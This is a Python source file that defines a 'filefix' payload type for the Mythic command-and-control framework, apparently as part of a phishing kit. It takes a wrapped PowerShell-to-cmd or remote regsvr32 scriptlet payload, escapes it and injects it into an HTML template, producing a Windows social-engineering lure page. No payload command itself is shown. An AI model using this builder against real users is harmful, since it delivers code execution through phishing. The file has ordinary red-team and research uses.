import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random

class filefix(PayloadType):
    name = "filefix"
    file_extension = "html"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["powershell_to_cmd", "cmd_regsvr32_remote_sct"]
    note = """Creates a filefix payload"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "phishingkit"
    agent_icon_path = agent_path / "agent_functions" / "phishing.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            cmd_payload = self.wrapped_payload.decode()
            cmd_payload = cmd_payload.replace('"', '\\"')

            f = open(os.path.join(self.agent_code_path, "filefix.html.template"), 'r')
            filefix_template = f.read()
            f.close()

            filefix_args = {
                "payload": cmd_payload,
            }

            resp.payload = filefix_template.format(**filefix_args)
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
